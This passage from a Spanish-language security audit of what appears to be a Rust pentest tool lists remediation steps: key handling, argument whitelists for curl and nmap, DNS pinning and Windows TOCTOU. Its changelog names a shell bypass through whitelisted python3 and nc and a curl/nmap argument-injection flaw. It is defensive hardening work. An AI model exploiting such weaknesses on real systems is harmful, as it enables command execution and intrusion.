1. **CRIT-003**: Generar una clave Ed25519 exclusiva para el proyecto. Configurar `ED25519_PUBLIC_KEY` como variable de entorno obligatoria. Hacer que el sistema **falle en inicio** (`bail!`) si la clave por defecto es detectada en producción, en lugar de solo advertir.

2. **NEW-001**: Implementar una whitelist de **argumentos** por binario en `execute_shell()`, no solo de binarios. Para `curl`, permitir solo `-I`, `-s`, `-o /dev/null`, `-H "..."` con targets ya validados por `is_ssrf_safe_host()`. Para `nmap`, validar el target con `is_safe_ip()` antes de ejecutar. Alternativa: ejecutar todos los PoC shell en contenedor Docker con `--network=none`.

### P1 — Correcciones de Alta Prioridad

3. **HIGH-001 (DNS Rebinding)**: Implementar DNS pinning a nivel de pipeline. Cuando `LivenessChecker::is_live()` resuelve una IP segura, almacenarla en el `TargetHost.ip`. Las herramientas externas y plugins deben recibir la IP directa (no el hostname) para eliminar la re-resolución.

4. **NEW-002**: En la rama Windows (`#[cfg(not(unix))]`), leer el archivo solo una vez y pasar los bytes ya leídos a `Library::new()` mediante un archivo temporal firmado (o esperar soporte de fd-based loading en Windows mediante `CreateFile` + `LoadLibraryEx(LOAD_LIBRARY_AS_DATAFILE)`).

### P2 — Mejoras de Robustez

5. **LOW-004**: Reemplazar `sync_lock.lock().unwrap()` por `sync_lock.lock().unwrap_or_else(|p| p.into_inner())` para evitar DoS por envenenamiento del Mutex del plugin FFI.

6. **LOW-006**: Verificar el retorno de `libc::kill()` y loguear el error si falla.

---

## Registro de Cambios

| Fecha | Versión | Acción |
|-------|---------|--------|
| 2026-04-06 | V1 | Creación del reporte inicial con hallazgos críticos, altos y medios. |
| 2026-04-07 | V10 | Auditoría completa post-hardening. Identificados 3 CRÍTICOS, 6 ALTOS, 6 MEDIOS. Bypass via whitelist `python3`/`nc`, TOCTOU, DNS Rebinding, memory leak FFI documentados. |
| 2026-04-07 | **V11** | **Auditoría total post-remediación.** Lectura línea por línea de todos los archivos fuente. **Mitigados confirmados**: CRIT-002 (TOCTOU fd-based), HIGH-002 (SSRF HTTP PoC), HIGH-003 (FFI memory leak), HIGH-004 (transmute corregido en análisis), HIGH-005 (sync_lock), HIGH-006 (C2 token obligatorio), MED-001 (canonicalize), MED-002 (setrlimit returns), MED-003 (ABI convention), MED-005 (report_gen unwrap), MED-006 (cfg unix). **Persisten/Nuevos**: CRIT-003 (clave test RFC 8032 — solo advertencia, no bloqueo), NEW-001 (curl/nmap arg injection — crítico nuevo), HIGH-001 (DNS rebinding en herramientas externas), NEW-002 (TOCTOU en Windows). |
